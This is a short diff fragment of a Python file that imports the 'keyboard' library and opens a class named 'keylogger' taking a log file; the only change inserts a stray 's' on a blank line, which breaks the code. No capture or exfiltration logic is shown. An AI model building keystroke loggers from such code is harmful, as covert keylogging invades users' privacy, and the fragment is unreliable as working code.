@@ -1,6 +1,6 @@
 import keyboard
 
-
+s
 
 class keylogger():
     def __init__(self,logFIle):
